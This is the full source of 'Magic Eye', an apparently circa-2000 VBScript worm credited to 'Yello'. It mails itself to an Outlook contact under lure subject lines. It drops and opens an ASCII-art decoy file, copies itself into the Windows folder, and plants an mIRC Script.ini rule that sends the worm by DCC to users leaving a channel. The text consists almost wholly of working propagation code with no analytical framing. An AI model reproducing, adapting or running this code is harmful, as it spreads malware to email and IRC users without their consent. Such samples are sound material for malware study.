   'Magic Eye By Yello 27/11/00  (Outlook &  mIRC)
   OutL00k()
   Sub OutL00k()
   On Error Resume Next
   Randomize
   Nik = Int((4 * Rnd) + 1)
   If Nik = 1 Then NikB = "Magic eye"
   If Nik = 2 Then NikB = "This really works"
   If Nik = 3 Then NikB = "Eye magic"
   If Nik = 4 Then NikB = "Good magic eye"
   Set Create = CreateObject("Outlook.Application")
   Set Create1 = Create.GetNameSpace("MAPI")
   Set ab = Create1.AddressLists(1/1)
   Set Yelp = Create.CreateItem(00)
   em = ab.AddressEntries (10 + 1 - 10)
   Yelp.Recipients.Add em
   Yelp.Attachments.Add WScript.ScriptFullName
   Yelp.Subject = NikB
   yelp.Body =  "This is good !!!!" & vbcrlf & "If you lower the font size it looks better."
   Yelp.Send
   Set Dump = CreateObject("Scripting.FileSystemObject")
   Set vx = Dump.CreateTextFile("c:\AVP.txt", True)
   vx.writeline(". ...")
   vx.writeline("                         .''.' .    '.")
   vx.writeline("                    . '' ".'.:I:.'..  '.")
   vx.writeline("                  .'.:.:..,,:II:'.'.'.. '.")
   vx.writeline("                  .'.:.:..,,:II:'.'.'.. '.")
   vx.writeline("                .':.'.:.:I:.:II:'.'.'.'.. '.")
   vx.writeline("              .'.'.'.'::.:.:.:I:'.'.'.'. .  '")
   vx.writeline("             ..'.'.'.:.:I::.:II:.'..'.'..    .")
   vx.writeline("            ..'.'':.:.::.:.::II::.'.'.'.'..   .")
   vx.writeline("           ..'.'.'.:.::. .:::II:..'.'.'.'.'.   .")
   vx.writeline("          .':.''.':'.'.'.:.:I:'.'.'.'.'.. '..  ..")
   vx.writeline("          ':. '.':'. ..:.::.::.:.'..'  ':.'.'.. ..")
   vx.writeline("         .:.:.':'.   '.:':I:.:.. .'.'.  ': .'.. . ..")
   vx.writeline("         '..:.:'.   .:.II:.:..   . .:.'. '.. '. .  ..")
   vx.writeline("        .. :.:.'.  .:.:I:.:. .  . ..:..:. :..':. .  '.")
   vx.writeline("       .:. :.:.   .:.:I:.:. .    . ..:I::. :: ::  .. ..")
   vx.writeline("       .. :'.'.:. .:.:I:'.        ..:.:I:. :: ::.   . '.")
   vx.writeline("       '..:. .:.. .:II:'         ,,;IIIH.  ::. ':.      .")
   vx.writeline("      .:.::'.:::..:.AII;,      .::"",,  :I .::. ':.       .")
   vx.writeline("      :..:'.:II:.:I:  ,,;'   ' .;:FBT""X:: ..:.. ':.    . .")
   vx.writeline("     .. :':III:. :.:A""PBf;.  . .f,1f;;"":: :I:..'::. .    ..")
   vx.writeline("     . .:.:II: A.'.';,ff:"" .  . ..'..' .: :.::. ':...  . ..")
   vx.writeline("     . .: .:IIIH:.   ' '.' .  ... .    .:. :.:.. :...    .'")
   vx.writeline("     . .I.::I:IIA.        ..   ...    ..::.'.'.'.: ..  . .")
   vx.writeline("      .:II.'.':IA:.      ..    ..:.  . .:.: .''.'  ..  . .")
   vx.writeline("     ..::I:,'.'::A:.  . .:'-, .-.:..  .:.::AA.. ..:.' .. .")
   vx.writeline("     ..::I:,'.'::A:.  . .:'-, .-.:..  .:.::AA.. ..:.' .. .")
   vx.writeline("     ..::I:,'.'::A:.  . .:'-, .-.:..  .:.::AA.. ..:.' .. .")
   vx.writeline("      ':II:I:.  ':A:. ..:'   ''.. . : ..:::AHI: ..:..'.'.")
   vx.writeline("     .':III.::.   'II:.:.,,;;;:::::"". .:::AHV:: .::'' ..")
   vx.writeline("     .."":IIHI::. .  ""I:.."":;,,,,;;"". . .:AII:: :.:'  . .")
   vx.writeline("     . . IIHHI:..'.'.'V::. "":;;;""   ...:AIIV:'.:.'  .. .")
   vx.writeline("      . . :IIHI:. .:.:.V:.   ' ' . ...:HI:' .:: :. .  ..")
   vx.writeline("      . .  ':IHII:: ::.IA..      .. .A .,,:::' .:.    .")
   vx.writeline("      :.  ...'I:I:.: .,AHHA, . .'..AHIV::' . .  :     ..")
   vx.writeline("      :. '.::::II:.I:.HIHHIHHHHHIHHIHV:'..:. .I.':. ..  '.")
   vx.writeline("   . . .. '':::I:'.::IHHHHHHHHMHMHIHI. '.'.:IHI..  '  '  '.")
   vx.writeline("    ':... .  ''"" .::'.HMHI:HHYELLOIHI. :IIHHII:. . . .    .")
   vx.writeline("     :.:.. . ..::.' .IV"".:I:IIIHIHHIH. .:IHI::'.': '..  .  .")
   vx.writeline("   . .:.:: .. ::'.'.'..':.::I:I:IHHHIA.'.II.:...:' .' ... . '..")
   vx.writeline("  '..::::' ...::'.IIHII:: .:.:..:..:III:.'::' .'    .    ..  . .")
   vx.writeline("  '::.:' .''     .. :IIHI:.:.. ..: . .:I:"' ...:.:.  ..    .. ..")
   vx.writeline("     .:..::I:.  . . . .IHII:.:'   .. .."".::.:II:.:. .  ...   . ..")
   vx.writeline("  .. . .::.:.,,...-::II:.:'    . ...... . .. .:II:.::  ...  .. ..")
   vx.writeline("   ..:.::.I .    . . .. .:. .... ...:.. . . ..:.::.   :..   . ..")
   vx.writeline("    .'.::I:.      . .. ..:.... . ..... .. . ..::. .. .I:. ..' .")
   vx.writeline("  .'':.: I.       . .. ..:.. .  . .. ..... .:. .:.. .:I.'.''..")
   vx.writeline("  . .:::I:.       . . .. .:. .    .. ..  . ... .:.'.'I'  .  ...")
   vx.writeline("  . ::.:I:..     . . . ....:. . .   .... ..   .:...:.:.:. ''.''")
   vx.writeline(""  '.'::'I:.       . .. ....:. .     .. . ..  ..'  .'.:..:..    '"")
   vx.WriteLine("        :. .     . .. .. .:.... .  .  .... ...   .  .:.:.:..    '.")
   vx.WriteLine("        :.      .  . . .. .:.... . . ........       .:.:.::. .    .")
   vx.WriteLine("        :. .     . . . . .. .::..:  . ..:.. .        ::.:.:.. .    .")
   vx.Close
   Set Shell = CreateObject("WScript.Shell")
   Shell.Run("notepad.exe c:\AVP.txt")
   Set mIRC = CreateObject("Scripting.FileSystemObject")
   Set Win = CreateObject("Scripting.FileSystemObject")
   Set ion = Win.GetSpecialFolder(0)
   If (mIRC.FileExists("D:\Program Files\mirc\mirc.ini")) Then Infect = "D:\Program Files\mirc\"
   If (mIRC.FileExists("D:\mirc\mirc.ini")) Then Infect = "D:\mirc\"
   If (mIRC.FileExists("C:\Program Files\mirc\mirc.ini")) Then Infect = "C:\Program Files\mirc\"
   If (mIRC.FileExists("C:\mirc\mirc.ini")) Then Infect = "C:\mirc\"
   If (mIRC.FileExists( ion & "\mirc\mirc.ini")) Then Infect = ion & "\mirc\"
   If (mIRC.FileExists( ion & "\Program Files\mirc\mirc.ini")) Then Infect = ion & "\Program Files\mirc\"
   if infect = "" then Exit sub
   Set fx = CreateObject("Scripting.FileSystemObject")
   Set Cpy = fx.GetFile(WScript.ScriptFullName)
   Cpy.Copy(ion & "\Magic_Eye.vbs")
   Set IRC = CreateObject("Scripting.FileSystemObject")
   Set Fi = IRC.CreateTextFile(Infect & "Script.ini", True)
   Fi.WriteLine("[script]")
   Fi.WriteLine("n0=on 1:PART:#: if ( $me != $nick ) { /dcc send $nick \Magic_Eye.vbs }")
   Fi.Close
   End Sub
